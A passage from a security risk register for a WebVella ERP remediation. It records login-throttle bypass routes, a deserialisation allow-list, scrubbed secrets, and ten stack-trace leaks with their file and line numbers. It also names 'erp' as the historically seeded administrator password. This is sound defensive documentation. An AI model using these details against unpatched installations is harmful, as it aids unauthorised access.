  register `AddJwtBearer` (`WebVella.Erp.Site`, `WebVella.Erp.Site.Project`) because that handler's
  options type ships in a package only those two reference; the **rule** stays single-sourced in the
  platform. Without this, a revocation check present only in the platform's own validator would have
  been decorative.

`AuthService.LogoutAsync` needed no change to revoke a bearer session: `JwtMiddleware` assigns
`HttpContext.User` from the presented token's claims, so the identifier the current principal carries
resolves correctly whichever credential the caller signed out with.

Recommended future work is unchanged in kind but reduced in urgency: a persisted, rotating refresh-token
table with reuse detection would additionally survive a restart and span instances. What remains is
therefore the *store scope* residual recorded as `RISK-036`, not the absence of revocation.

#### RISK-008 — Login throttling is per-process

| Field | Value |
| --- | --- |
| **Status** | Accepted — documented limitation. Recommended future work. |
| **Related finding** | H-16 / H-6, H-7 (CWE-307, OWASP A07:2021) |

The throttle is backed by an in-process store, chosen so the control required **no schema change and
no new dependency**. In a multi-instance or load-balanced deployment each instance counts
independently, so effective thresholds multiply by the instance count. A distributed backing store is
recommended and deliberately not built. Operators running more than one instance should also enforce
throttling at the load balancer.

Two further bounded trade-offs:

* **Account lockout is a denial-of-service primitive.** It lapses automatically after 15 minutes
  rather than requiring administrator action, so an attacker can lock a known account for 15 minutes.
  That is a deliberate trade against making credential stuffing cheap.
* **The store is size-bounded** to cap memory growth against an attacker varying the username.
  Displacing a specific account's partial count requires cycling the entire store, which buys at most
  a few extra guesses.
* The per-address threshold is deliberately **five times** the per-account threshold, because NAT and
  shared corporate egress mean many legitimate users share one address.

**Bypass-resistance model, and what remains residual.** Each of the four evasion routes below is
named at the control it constrains in `WebVella.Erp.Web/Services/LoginThrottleService.cs`, where the
comment states the invariant the code upholds. They are restated here because what belongs in a risk
register is the part the code cannot express: the residual that each closure leaves behind, and who
has accepted it. The duplication is deliberate, not an oversight - a reader of either artefact alone
would otherwise be missing half the picture:

* **Source-address rotation.** A combined username-and-address key — which the first revision of the
  service used — gives an attacker with a proxy pool a fresh budget per address for the same account,
  so a targeted account never locks. Closed by counting the account and the address on independent
  keys: a failure advances the account counter regardless of where it came from.
* **Username rotation.** The mirror image: rotating the submitted username gives a fresh budget from
  one address. Closed by the same independence — the address counter advances regardless of which
  account was named. Residual: an attacker who rotates *both* dimensions is bounded only by the
  transport rate limiter, which is the layer that exists for that case.
* **Cache-eviction displacement.** The store is size-bounded at 20,000 tracked principals with 20%
  compaction, so an attacker minting distinct usernames forces eviction rather than growth. Eviction
  takes the lowest priority first and in-force lockouts are written at `High` while still-counting
  entries are written at `Low`, so a flood evicts other partial counts long before it releases any
  lockout. `NeverRemove` is deliberately **not** used: it would exempt lockout entries from the
  ceiling and restore the unbounded growth the bound exists to prevent. Residual, accepted:
  displacing one specific account's partial count costs a full store turnover — tens of thousands of
  requests through a transport rate limiter — to buy back at most four guesses.
* **Time-of-check/time-of-use (CWE-367).** A check-then-authenticate-then-count protocol lets every
  request in a concurrent burst read the same pre-attack counter and pass, so the threshold never
  trips under exactly the concurrent load it exists to stop. Closed by reserving an attempt before
  authenticating and finalising it afterwards, with outstanding reservations counted towards the
  threshold. Residual: a reservation whose caller dies before finalising stays outstanding until the
  entry expires, which can only ever refuse **more**, never less, and lapses within the 15-minute
  window.

#### RISK-009 — A throttle refusal and a credential rejection differ in response length

| Field | Value |
| --- | --- |
| **Status** | Accepted — resolves itself when H-13 is fixed. |
| **Related finding** | H-16, H-13 |

On the bearer-token route a genuine credential rejection returns a longer body than a throttle
refusal, because the rejection currently includes exception text (finding H-13). Measured: a
credential rejection returns **518 characters** while a throttle refusal returns **25**. The two
become indistinguishable once H-13 removes the stack trace — so fixing H-13 closes this entry as a
side effect rather than requiring separate work. The login page itself preserves a single generic
message and was verified to render **pixel-for-pixel identically** on the fifth and sixth attempts, so
it is not an enumeration oracle.

#### RISK-010 — Identifier length bound, and the truncation-collision residual it cannot close

| Field | Value |
| --- | --- |
| **Status** | Accepted. **Restated at the code-review checkpoint (finding `F-03`'s sibling, `F-07`)** — the previous wording described a 63-byte bound that had to be corrected to 67. |
| **Related finding** | H-09 (CWE-89, OWASP A03:2021) and code-review finding `F-07`. |

PostgreSQL truncates identifiers at **63 bytes** (`NAMEDATALEN - 1`). That is a fact about the
database, and it is *not* the bound the identifier helper enforces. The helper enforces **67 bytes**,
and the distinction is the whole substance of this entry.

**Why 67 is the correct bound, measured rather than assumed.** Every one of the helper's **21** call
sites — counted as `DbIdentifier.Validate` or `DbIdentifier.Quote` invocations in tracked C# with
comments stripped, across seven files: `DbRelationRepository` 6, `CodeGenService` 4, `DbRecordRepository`
3, `EqlBuilder.Sql` 3, `DbEntityRepository` 2, `DbRepository` 2 and `SdkPlugin.20210429` 1 —
passes an *already-prefixed* name, and every prefix in the codebase is exactly 4 bytes (`rec_`,
`rel_`). The platform independently caps an entity or field **name** at 63 characters —
`ValidationUtility.ValidateName` throws if asked for a maximum above 63, and `EntityManager` applies
that cap on create and update. So 63 + 4 = **67** is the longest legitimate physical name the platform
can produce, and a 63-byte cap in the helper would reject entity names of 60 to 63 characters that the
platform itself considers valid — a functional regression, not a hardening win.

**The injection control is the allow-list, not the length.** Validation is a strict character
allow-list plus double-quoting; the length bound exists only to respect PostgreSQL truncation. Names
beyond 67 bytes fail hard.

**The residual, stated precisely.** PostgreSQL truncation is **deterministic**: one over-long name
truncates identically on every statement and resolves correctly forever. A *collision* requires **two**
names agreeing on their first 63 bytes — which is a creation-time **uniqueness** question, and a
quoting helper cannot answer it because it only ever sees one name at a time. Refusing to quote could
not undo a collision already created by an earlier `CREATE TABLE`; it would only block addressing the
data, including the `DROP TABLE` that is the one operation able to clean it up. The residual therefore
belongs to entity-creation uniqueness validation, which is out of scope for a security remediation.

**A wider, pre-existing gap named for completeness.** Index names bypass this helper entirely. They are
composed as `idx_r_{relation}_{field}` — up to **133 bytes** — and `DbRepository.CreateIndex` and
`DropIndex` interpolate them with **no length check at all**. The platform has therefore always relied
on deterministic truncation at far greater lengths than the helper permits. Documented, not fixed.

#### RISK-011 — Derived page models must never re-declare `ReturnUrl`

| Field | Value |
| --- | --- |
| **Status** | Standing warning — a defect of this exact shape was found and fixed during remediation. |
| **Related finding** | H-1 (CWE-601, CWE-79, OWASP A01/A03:2021) |

The open-redirect fix is a **sanitizing setter on the base page model**, so every page inherits it
from one chokepoint. A derived model that re-declares the property with `new` **silently defeats it**:
model binding targets the most-derived declaration, so the raw value bypasses the sanitizer entirely.

Exactly that existed on the login page and was removed. Its effect was worse than an open redirect —
the unsanitized value reached a local-redirect sink, which threw, returning **HTTP 500 with a full
stack trace to an anonymous, pre-authentication caller**.

**Generalizable lesson: a chokepoint fix in a base class is only as strong as the guarantee that no
subclass shadows it.** Any future page model that needs a different bind name must route through the
sanitizer rather than re-declaring the property. A second, independent bypass was also found and
fixed in a page-header component that read the raw query string directly — a chokepoint does not help
where code declines to use it.

### Pre-existing issues named but deliberately not fixed

Named so they are not mistaken for regressions introduced by this remediation, and so a future scan
result is not misread. Two entries in this table — `RISK-013` and `RISK-014` — have since been
**closed** by later work in this engagement. They are retained here and marked closed rather than
deleted, so that the historical record stays legible and so that a reader of an older copy can tell
which statements changed.

| Ref | Issue | Why not fixed |
| --- | --- | --- |
| RISK-012 | **The generic record-update path can wipe a password hash.** The user-facing save path correctly ignores a blank incoming password, verified by a real UI save leaving the hash byte-identical. The *generic* record-update path guards only against `null`, not an empty string, which would be converted to `NULL` downstream. | Pre-existing and unchanged by the credential work. Named in [the credential migration guide](credential-migration.md) so it is not attributed to the migration. |
| RISK-013 | ~~Two hosts serve a permissive `Access-Control-Allow-Origin: *`.~~ **No longer accurate — resolved.** Both hosts now register an explicit `WithOrigins(...)` allow-list and read `Settings:Cors:AllowedOrigins`. A repository-wide scan for a *live* (non-commented) `AllowAnyOrigin()` across all seven host `Startup.cs` files returns **zero** occurrences. A supplied list wins in every environment; an empty list denies every origin; an absent key denies every origin outside Development and selects the host's own Development fallback — three localhost origins for `WebVella.Erp.Site`, and those three plus `http://localhost:2202` for `WebVella.Erp.Site.Project`. Runtime checks on both hosts confirmed listed origins receive `Access-Control-Allow-Origin` with `Vary: Origin` and unlisted origins receive neither. | **Fixed.** Recorded as finding `P-06` in [the audit report](security-audit-report.md). |
| RISK-014 | ~~Two bearer-token error paths return stack traces **unconditionally**.~~ **No longer accurate — resolved.** Both anonymous token endpoints now log server-side and return a generic message, with full exception text emitted only behind the development-mode guard. Measured: the last `StackTrace` reference in the controller is at **line 5264**, while the token and refresh actions begin at **5287** and **5395**, so neither anonymous action contains one. | **Fixed** as `H-13`. The ten *authenticated* actions that still leak are a separate, pre-existing residual — see `RISK-032`. |
| RISK-015 | `/ckeditor/ImageFinder` returns HTTP 500 — its page model does not derive from the type its layout requires. **Proven pre-existing by counterfactual**: reverting the view to its original content reproduced the identical exception. | A reliability defect, not a security one. |
| RISK-016 | Three navigation anchors carry `href="javascript: void(0)"` — Bootstrap dropdown toggle placeholders, byte-identical on every page. **These are not injection sinks.** | Named specifically so a future "the HTML contains `javascript:`" scan hit is not misread as a leak. |
| RISK-017 | One host's `Startup.cs` lacks the UTF-8 byte-order mark that the repository's own `.editorconfig` mandates and every sibling file carries. | Cosmetic encoding inconsistency, pre-existing. Deliberately not "fixed", to avoid an unrelated whole-file diff. |
| RISK-018 | Four accessibility advisories (label/form-field association, missing autocomplete attributes). | Not security findings; documentation only. |
| RISK-019 | Two vendored source-map files return HTTP 405. Requested only by browser developer tools, never by any page. | Cosmetic. |
| RISK-020 | On one management page `document.title` disagrees with the visible heading. | Cosmetic. |
| RISK-025 | Four residual observations around the `H-10` binder, all measured rather than assumed — see the detailed entry below. | Three are by design, including the maintenance obligation the enumerated allow-list creates, and one is a pre-existing functional quirk with no security consequence. |

#### RISK-025 — Residual observations around the H-10 deserialisation binder

| Field | Value |
| --- | --- |
| **Status** | Accepted for the first two and the fourth; named-not-fixed for the third. |
| **Related finding** | `H-10` — unsafe polymorphic deserialisation (CWE-502, OWASP A08:2021). |
| **Cited from** | `WebVella.Erp/Api/Models/AutoMapper/Profiles/JobProfile.cs` |

**1. The binder is inert at an `ExpandoObject` target — accepted, by design.** Newtonsoft dispatches
an `ExpandoObject` target to its own `ExpandoObjectConverter`, which treats `$type` as an ordinary
member and never resolves it. Measured: an identical gadget payload yields the same
`ExpandoObject` with keys `[$type]` with the binder attached and with it absent. The consequence is
benign in both directions — **no type is instantiated from the payload at those sites either way**, so
they were never the CWE-502 exposure, and the attachment is defence in depth that becomes
load-bearing the moment a target type changes. It is recorded because a reader who assumes all four
attachment sites are equally load-bearing would over-state the control, and because a future change
of target type from `ExpandoObject` to `object` would silently move the site from inert to critical.
The exposure lived at the POCO-targeted statements and inside any `dynamic` or `object`-typed member
of one, which is where the confirmed-then-closed exploit is recorded in the
[remediation log](remediation-log.md).

**2. The serialisation counterparts are deliberately unconstrained — accepted, by design.**
`WebVella.Erp/Jobs/JobDataService.cs` configures `TypeNameHandling.All` at four sites and is the
*write* counterpart that produces the exact JSON `JobProfile.cs` reads;
`WebVella.Erp/Notifications/NotificationContext.cs` configures `TypeNameHandling.Auto` at two.
Serialisation is **not** the CWE-502 attack surface: constraining what the platform is willing to
*write* protects nothing, because the attacker's leverage is over what is *read*, and it would break
writing. `BindToName` is correspondingly left unoverridden on the binder itself. Both files
nonetheless attach the binder at their read-adjacent settings, which is harmless and consistent; no
further change is warranted and none should be made on the strength of a scanner hit against
`TypeNameHandling` alone.

**3. The `JobResultWrapper` fallback branch is effectively unreachable — named, not fixed.** The job
`result` read path attempts `ExpandoObject` first, for backward compatibility, and falls back to
`JobResultWrapper` in a `catch`. Because `ExpandoObject` deserialisation **succeeds** on
wrapper-shaped JSON — again, `ExpandoObjectConverter` treats `$type` as an ordinary member — the first
attempt wins and the fallback is not reached for a well-formed wrapper payload; the caller receives an
`ExpandoObject` carrying `$type` and `result` keys rather than the unwrapped value. Measured
identically with and without the binder, so this is **pre-existing behaviour and not a regression**.
It is a functional quirk with no security consequence, and correcting the ordering would change the
shape of a value returned to every consumer of `Job.Result` — precisely the behavioural change the
minimal-change constraint forbids. Named so that a future reader does not attribute it to the binder
work, and so that anyone who does intend to reorder the attempts knows what depends on it.

**4. The enumerated allow-list carries a standing maintenance obligation — accepted, with a stated
trigger.** Closing review finding `F-03` replaced namespace discovery with an explicit `typeof`
inventory, `PersistedModelTypes`, holding **45** core-library types instead of the **268** the namespace
scan admitted. That is what removes the 38 behaviour-carrying types — seven repositories, thirteen
object-mapping profiles, eight converters, three attributes, two ambient contexts, two managers, a job
pool, a job data service and an exception — four of which were confirmed instantiable through the
`jobs.result` column before the change. The trade is deliberate: an enumeration cannot admit something
nobody listed, which is precisely the property that makes it a real allow-list, and equally the
property that makes it something to keep current. Forty-four of the forty-five entries are the closure
itself; the forty-fifth, `DbSystemSettings`, is a deliberate addition annotated at its entry in the
source - no deserialisation site reads it, and it is retained only so the `DbDocumentBase` subclass set
stays complete for a collection discriminator that names the abstract base as a generic argument.

The obligation is therefore explicit. **If a core-library type newly becomes part of a persisted graph
that any deserialisation site reads, it must be added to `PersistedModelTypes` in
`WebVella.Erp/Api/Models/ErpSerializationBinder.cs`, and the addition recorded in the
[remediation log](remediation-log.md).** The failure mode if that is missed is loud rather than silent —
a `JsonSerializationException` naming the rejected assembly and type, raised at the read — which is the
correct direction for a security control to fail, but it will present as a functional fault, so the
cause is written down here to shorten the diagnosis. Two properties bound the exposure of forgetting:
the inventory entries are compile-time `typeof` expressions, so a removed or renamed type breaks the
build rather than quietly narrowing the list; and one deserialisation path is guarded twice, because a
`$type` inside `DbEntity.Fields` must also be assignable to `DbBaseField`.

Two things this obligation is **not**. It is not a new restriction on plugin-authored types: those were
already unable to be named before this change, because the previous map was built from the pinned core
assembly alone, so nothing that worked has stopped working. And it is not hypothetical maintenance
debt dressed up as a risk — the same narrowing fixed a live instance of exactly this failure mode,
`WebVella.Erp.Api.CurrencySymbolPlacement`, which a currency field genuinely reaches yet which sat
outside all five scanned namespaces and was being **refused** before the enumeration included it.

#### RISK-021 — The shipped configuration files contained development secrets (now closed)

| Field | Value |
| --- | --- |
| **Status** | **Closed for the tracked configuration files.** The enabling half had landed earlier; the scrub itself has now landed too. The residual is tracked separately as `RISK-026`. |
| **Related finding** | The secret-management class (hardcoded credentials, weak shipped signing key, development mode enabled). Adjacent to M-2, which delivered the validation and provider chain. |

**The state this entry originally described.** All eight `Config.json` files, and one host's
`web.config`, carried development values in the tracked tree: connection strings including passwords,
`"DevelopmentMode": "true"`, and a token signing key **published in this public repository** — which
`WebVella.Erp.Site/JWT_README.txt` additionally republished as documentation. The seeded administrator
password was the literal `"erp"`. A demo credential also appeared in a WebAssembly client page.

**What was closed.** Every secret value in all eight `Config.json` files is now blank, every file sets
`"DevelopmentMode": "false"`, `WebVella.Erp.Site/web.config` sets `Production`, `JWT_README.txt` no
longer republishes the key, and `WebVella.Erp/ERPService.cs` resolves the initial administrator
password from a required operator-supplied setting and from nowhere else — no credential is generated
and none is written to any output stream. The files were **scrubbed and retained, never deleted** — the JSON configuration source
is not optional, so deleting them breaks start-up outright. Ordering was load-bearing and was already
satisfied: the provider chain had to land *before* any scrub, or every host would fail to start with no
channel to supply a replacement.

**Verified rather than asserted.** The secrets gate now passes on the tracked tree, sweeping 13
configuration files with 15 checks and 0 failures. A host started with a required secret absent aborts
with a message naming only the missing key **names**. A host started with both secrets supplied *only*
through environment variables boots and serves a successful login. The details are in the
[remediation log](remediation-log.md).

**What is still true, and why it still matters:**

* Known published key material is refused by digest comparison, not merely absent — so a value
  recovered from this repository's history cannot be used even deliberately.
* Environment variables supply the secrets, touching no tracked file. See
  [the secure configuration guide](secure-configuration.md) and
  [`README.md`](https://github.com/Blitzy-Sandbox/blitzy-WebVella-ERP/blob/master/README.md).
* Absent or insufficient-entropy secrets fail closed outside Development.

**Operator obligation.** Every value that ever appeared in this repository's history must still be
treated as public knowledge and never reused. The application will not start until the required
secrets are supplied; that is the intended behaviour, not a defect.

#### RISK-026 — Residual secret exposure outside the scrubbed file set

| Field | Value |
| --- | --- |
| **Status** | **Reduced.** The first residual below is **closed**; the second is accepted with a detective control. |
| **Related finding** | Residual of `RISK-021`. Reclassified by cumulative-review finding `F3`. |

This entry originally recorded two residuals of the configuration scrub. One has since been closed,
and the scope judgement that had deferred it was **overridden in review**. Both the original position
and the override are stated, because a reclassification that is silently applied is indistinguishable
from an inconsistency.

* **A demo credential in the Blazor WebAssembly client — CLOSED.**
  `WebVella.Erp.WebAssembly/Client/Pages/Index.razor.cs` authenticated with a literal e-mail and
  password. This entry previously deferred it on the ground that the Blazor WebAssembly client project
  was outside the remediation's authorised file set. **Cumulative-review finding `F3` names that file
  explicitly, which supersedes the scope judgement**, so the literal was removed rather than left
  recorded. `_login()` now calls `NavigationManager.NavigateTo("/login")`, reaching the client's own
  existing login page — `LoginPage.razor` routes `/login` to the complete `WvLogin` component — so
  **no capability was added and none was lost**; the same route is already this client's redirect
  target for an unauthenticated caller.

  The fix is removal rather than relocation to configuration, deliberately. A Blazor WebAssembly
  assembly **and its configuration** are downloaded in full to every visitor's browser, so moving the
  literal into a settings file would publish the identical secret through a different file. There is
  no client-side location where a credential is less exposed than in the source.

  A tracked-tree sweep for credential-shaped assignments now returns nothing, and that sweep runs in
  CI over the whole tracked tree rather than over a configuration allow-list, so a reintroduction in
  any file — including this one — fails the build.
* **Repository history — ACCEPTED, with a detective control.** Blanking a tracked file does not remove
  the value from earlier commits, and removing the demo credential does not either: it was introduced
  **upstream** and is reachable from `HEAD`, so `erp` was a genuinely valid seeded administrator
  password for the lifetime of those commits. Two durable controls bound this. First, the two published
  default keys are rejected by digest comparison, so they cannot be used even deliberately. Second, the
  seeded administrator credential is **rotated on upgrade**, not merely on fresh provisioning:
  `RevokeSeedAdministratorCredential4` in `WebVella.Erp/ERPService.cs` replaces it under the schema
  version 4 gate, and CI asserts that migration is still present so the rotation cannot be dropped.
  What remains genuinely unmitigated is the connection-string password and the mail password, which
  must be rotated by an operator. A CI history audit reports each known exposure by commit count on
  every run, and fails closed if the checkout is shallow enough to hide them, so the residual stays
  visible instead of decaying into folklore. **Recommended fix:** rotate every credential that ever
  appeared in a tracked file, and treat history rewriting as a separate, owner-approved operation.

#### RISK-027 — The initial administrator password is not forced to be rotated

| Field | Value |
| --- | --- |
| **Status** | Accepted. |
| **Related finding** | C-01 (hardcoded default administrator password). |

The seeded credential is now supplied by the operator through
`Settings:InitialAdministratorPassword`, is required (12–128 characters), and is unique per
installation. What it does **not** have is a change-required-on-first-login marker, because there is
no field to carry one, nothing in the platform reads such a marker, and adding a column is a schema
change the constraints forbid.

**Superseded sub-risk, recorded rather than quietly dropped.** An interim revision resolved C-01 by
*generating* a 20-character value with `RandomNumberGenerator.GetItems<char>` and echoing it once to
standard error so an operator could read it back. That is no longer the behaviour, and the change was
not a refinement — the emission was itself a vulnerability (CWE-532, OWASP A09:2021). Standard error
is captured and retained wholesale by every substrate this platform is hosted on (systemd's journal,
the Docker log driver, IIS stdout redirection, Kubernetes container logs, CI transcripts), so the
"one-time" notice was durable plaintext readable by everyone holding log or host access, and it was
written *before* the surrounding provisioning transaction committed. The generator was removed rather
than hardened, because any invented credential must be communicated back to the operator and every
channel available inside a provisioning transaction is a durable, multi-reader one. Requiring the
operator's own value is the only shape of the code that never holds a credential it has to disclose.

The compensating control for the residual is that the password is chosen per installation by its own
operator and is never written to any output stream, log or exception message — so it is known to
exactly one party. **Recommended fix, for a change permitted to alter the schema:** add a
`must_change_password` boolean to the user entity and gate the post-login redirect on it.

#### RISK-028 — A local package mirror makes the dependency audit silently inert

| Field | Value |
| --- | --- |
| **Status** | Accepted — mitigated by a second, independent mechanism. |
| **Related finding** | The dependency gate's fail-open behaviour. |

Promoting `NU1900` and `NU1905` to errors closes the case where the advisory database is
**unreachable**: the restore then fails with `error NU1900` instead of passing with a warning. It
cannot close the case where the only configured package source is a **local folder mirror**, because
that configuration emits **no `NU19xx` diagnostic at all** — there is nothing to promote. Both
configurations were reproduced; they behave differently, and that difference is the whole point of
this entry.

The mitigation is a different mechanism rather than a stronger version of the same one: the CI
workflow restores a throwaway project pinned to a package with a known High-severity advisory and
**requires** that restore to fail with `NU1903`. Against a local-mirror configuration that step fails
the job and states that every clean result in the run is unverified. **Neither mechanism is redundant
with the other**, which is why both are kept. The residual is that a developer running a local restore
outside CI has only the promotion, not the control.

#### RISK-029 — A project assigning `WarningsAsErrors` would discard the dependency gate

| Field | Value |
| --- | --- |
| **Status** | Named, not fixed — documented control only. |
| **Related finding** | The dependency gate's inheritance model. |

MSBuild imports `Directory.Build.props` **before** the body of each project file, so a `.csproj`
containing a bare `<WarningsAsErrors>CS0168</WarningsAsErrors>` overwrites the gate's promotion rather
than adding to it — and the build then stays green with a known High-severity advisory in that
project's graph. Measured: a probe declaring exactly that resolves the property to
`CS0168;SYSLIB0011` and restores a vulnerable package at exit 0 with only `warning NU1903`.

**No project in this repository does this today**, verified rather than assumed: `Directory.Build.props`
is the only MSBuild customisation file in the tree, and none of the 19 `.csproj` files mentions
`WarningsAsErrors`, `TreatWarningsAsErrors` or `NoWarn`. The in-scope control is documentation — the
contributor warning in [the secure configuration guide](secure-configuration.md) and the design note in
[the remediation log](remediation-log.md). **Recommended structural fix:** add a
`Directory.Build.targets` that re-appends the six codes after all project bodies are evaluated, making
the mistake impossible rather than merely documented. Not done here because it adds a second
build-customisation file outside the authorised file set.

#### RISK-030 — A solution-level command covers 17 of 19 projects

| Field | Value |
| --- | --- |
| **Status** | Accepted — the two non-members are covered by explicitly gated per-project commands, and CI proves the arithmetic in three directions. |
| **Related finding** | H-19 (build-graph integrity), H-18 (end-of-life framework), and the cumulative review's gate-coverage finding. |

**The position on this risk has moved twice, and both moves are recorded because the second reverses the
first.**

*What it is.* `WebVella.ERP3.sln` enumerates **17** of the repository's 19 `.csproj` files.
`WebVella.Erp.WebAssembly/Server` and `.../Shared` are **not** members, so a solution-wide restore, build,
audit or analyzer run does not see them and they must be covered by explicit per-project commands.

*The first move — enrolment — is withdrawn.* Both projects were briefly added to the solution, on the
reasoning that the cumulative review required them either enrolled or explicitly gated. That enrolment has
been **reverted**. AAP 0.6.1 Class 1 authorises exactly one change to `WebVella.ERP3.sln` — the
project-reference path **casing** repair — and enrolling two projects is not that change. Solution
membership is also not itself a security fix, so it falls under the prohibition on changes beyond
remediation. The diff against `origin/master` for that file is now casing-only, and `dotnet sln list`
returns **17**.

*The second move — explicit gating — is what closes the coverage question.* The review's requirement was
disjunctive: enrolled **or** explicitly restored, built and audited in every gate. The workflow takes the
second branch, in three dedicated steps — *Restore the explicitly gated projects with dependency
auditing*, *Build the explicitly gated projects and assert their target framework*, and *List vulnerable
packages for the explicitly gated projects*. Coverage is therefore complete; it takes three commands
rather than one.

*The arithmetic, and why the three figures deliberately disagree.* `dotnet sln list` returns 17,
`git ls-files '*.csproj'` returns 19, and a solution-level package listing enumerates 17. The reconciliation
is **17 solution members + 2 explicitly gated non-members = 19 manifests**, and the workflow asserts it in
three directions rather than trusting one: it checks the member count, checks that the non-member set is
exactly the two expected projects by name, and checks that the totals reconcile. It fails closed if any
enumeration comes back empty, so an assertion that inspected nothing cannot report success.

*Two consequences that are easy to get backwards, stated explicitly.* The `net10.0` **retarget** was never
at risk, so H-18 was closed throughout. And the build gate reaches both projects regardless of membership,
because `Directory.Build.props` is **directory**-scoped rather than solution-scoped — inheritance is
deliberately broader than membership. What membership affects is *command* coverage only, which is exactly
what the three gated steps supply.

*What prevents regression.* The membership assertion was retained rather than deleted, and **retargeted**:
it no longer demands that every tracked project be a member — which is now false by design — but instead
reconciles the 17/2/19 split and names any project that is neither a member nor one of the two expected
non-members. Keeping it mattered because it is the only independent `dotnet sln list` oracle in the
The declared list has exactly one home, the job-level `EXPLICITLY_GATED_PROJECTS`, which the assertion reads rather than restates - an earlier revision hard-coded an empty set beside it and produced three contradictory descriptions of one graph.
workflow. Verified both ways: it passes on the tree as it stands and detects a synthetic third non-member.

#### RISK-031 — Unpublished output under a non-Development environment serves no static assets, and the obvious workaround undoes two remediations

| Field | Value |
| --- | --- |
| **Status** | Named, not fixed — documented control only. |
| **Related finding** | `H-12` (development mode disabled) and `H-15` (HSTS and HTTPS redirection), both of which the tempting workaround would undo. |

Observed during this checkpoint's cross-cutting regression verification, not reported by any finding.
Running `WebVella.Erp.Site` from `bin/Debug/net10.0` with `ASPNETCORE_ENVIRONMENT=Production` made
**every** `/_content/**` request return `405` with `Allow: DELETE`, so the application rendered with
browser-default styling and the browser console filled with resource and MIME-refusal errors.

The cause is a launch configuration, not a defect in anything this remediation touched, and it was
root-caused rather than assumed. These hosts ship **no `wwwroot`** — none is present in the source
tree, none in the build output, and `git ls-files` shows none was ever tracked — so all static content
is served from Razor Class Libraries through the `_content/**` convention. That convention depends on
the static-web-assets manifest, which ASP.NET Core's loader reads **only when the environment is
Development**, unless the host builder opts in explicitly; `WebVella.Erp.Site/Program.cs` uses
`WebHost.CreateDefaultBuilder(args)` and does not call `UseStaticWebAssets()`. Under Production the
manifest is therefore never read, `_content/**` is unmapped, and the request falls through to a
`DELETE`-only catch-all route — which is exactly where the `405` and its `Allow: DELETE` originate.
Confirmed by the controlled experiment: the *same binary* serving the *same URLs* returns `405
text/html` under Production and `200` with correct content types under Development.

The security-relevant part is not the `405`. It is that the seven security headers **are** still
emitted on that `405`, so a header verification still passes while the site looks broken — and the
quickest way to make the styling return is to set `ASPNETCORE_ENVIRONMENT=Development`, which
**re-enables the developer exception page (`H-12`) and disables both `UseHsts()` and
`UseHttpsRedirection()` (`H-15`), because those are deliberately guarded to non-Development
environments.** A cosmetic annoyance thus creates direct pressure toward a real security regression,
which is why it is recorded here rather than left as a note.

Attribution is explicit: `WebVella.Erp.Site/Program.cs` and any `wwwroot` are untouched by this
remediation — `git diff` against the checkpoint base returns nothing for either path, and there are no
uncommitted changes to them. The condition predates this work and is unrelated to it.

**Recommended fix, for a change permitted to alter the host builders:** call `UseStaticWebAssets()`
explicitly on the host builder, or verify only `dotnet publish` output, where the assets are
materialised physically and the manifest is not needed. Either closes the symptom without touching the
environment setting. Until then the operator guidance is stated in the
[secure configuration guide](secure-configuration.md).

#### RISK-032 — Ten authenticated API actions still return a stack trace in the response body

| Field | Value |
| --- | --- |
| **Status** | Named, not fixed — outside the authorised change scope. |
| **Related finding** | `H-13`, which covered the *unconditional, anonymously reachable* instances and **is fixed**. |
| **Weakness** | CWE-209, information exposure through an error message. |
| **Location** | `WebVella.Erp.Web/Controllers/WebApiController.cs`, lines 4273, 4491, 4531, 4557, 4589, 4643, 4713, 4736, 4809 and 5264. |

Every one of the ten is the identical statement, `response.Message = e.Message + e.StackTrace;`, and
each is preceded by a server-side log write, so the disclosure is additive rather than a substitute
for logging.

**Why these are not in scope while `H-13` was.** The remediation's error-handling class is scoped to the
two error paths that were both *unconditional* — not gated by any development-mode check — and
*anonymously reachable*, which is what made them exploitable without credentials and unfixable by
configuration alone. These ten are neither. All ten sit behind the controller's class-level
`[Authorize]` attribute, and the only three live `[AllowAnonymous]` actions in the file are at lines
1191, 5286 and 5394 — none of which contains a stack-trace write. The enclosing actions are
`GetPlugins`, `UpdateSchedulePlan`, `TriggerNowSchedulePlan`, `GetSchedulePlansList`, `GetSchedulePlan`,
`CreateTestSchedulePlan` (twice), `GetUserFileList`, `UploadUserFile` and `GetSnippetText`. An attacker
must therefore already hold a valid session to see any of them.

**Proven pre-existing, not a regression.** The count and the statement text are unchanged: the file
carries exactly ten at the checkpoint base and exactly ten now, and the set of distinct statement
forms is the single string above in both. The line numbers differ only because earlier remediation
inserted code above them.

One of the ten deserves a specific note, because it sits directly beside a change this remediation did
make. Line 4809 is the *general* `catch (Exception e)` in `UploadUserFile`. The authorization check
added for the file-promotion work throws `UnauthorizedAccessException`, and rather than widen this
pre-existing catch, a dedicated `catch (UnauthorizedAccessException uae)` was inserted **ahead** of it
which returns only `uae.Message` — no stack trace — and logs with `DoNotNotify`. So the authorization
denial path introduced here does not leak; the residual is confined to genuinely unexpected exceptions,
exactly as it was before.

**Recommended fix.** Replace all ten with a generic message while retaining the existing log write,
mirroring the guarded pattern already present in `ApiControllerBase`. This is a mechanical, low-risk
change, but it is ten edits to response bodies across eight actions, which is a user-visible behaviour
change in an authenticated surface and therefore beyond the minimal change this engagement authorises.
It is cross-referenced from the [secure configuration guide](secure-configuration.md) so that an
operator reading about error handling is not left believing the surface is entirely clear.

#### RISK-033 — Provisioning emits six pre-existing bootstrap DDL statements

| Field | Value |
| --- | --- |
| **Status** | Named, not fixed — pre-existing platform bootstrap. |
| **Related finding** | The "no database schema changes" preservation requirement, and the version-4 migration that now satisfies it. |
| **Location** | `WebVella.Erp/Database/DbRepository.cs` — `CreatePostgresqlCasts()` at line 13, whose statement spans lines 17–20, and `CreatePostgresqlExtensions()` at line 26, whose statements are at lines 30 and 37. |

Recorded so that the claim "the remediation emits no schema definition statements" is stated
**precisely rather than absolutely**. The six statements are:

* `DROP CAST IF EXISTS(varchar AS uuid);` — line 17
* `DROP CAST IF EXISTS(text AS uuid);` — line 18
* `CREATE CAST(text AS uuid) WITH INOUT AS IMPLICIT;` — line 19
* `CREATE CAST(varchar AS uuid) WITH INOUT AS IMPLICIT;` — line 20
* `CREATE EXTENSION IF NOT EXISTS "uuid-ossp";` — line 30
* `CREATE EXTENSION IF NOT EXISTS "postgis";` — line 37, inside a `try` because the extension may not be installed

**They are platform bootstrap, not migration.** Both helpers are invoked once from the provisioning
entry point in `ERPService`, at lines 69 and 71, before any schema version is consulted. They are not
reached from the `if (currentVersion < 4)` block, and the version-4 migration itself was changed
precisely so that it emits **no** record-schema DDL, which was verified by a database event trigger
rather than by reading a server log. A full provisioning run of a fresh database therefore shows these
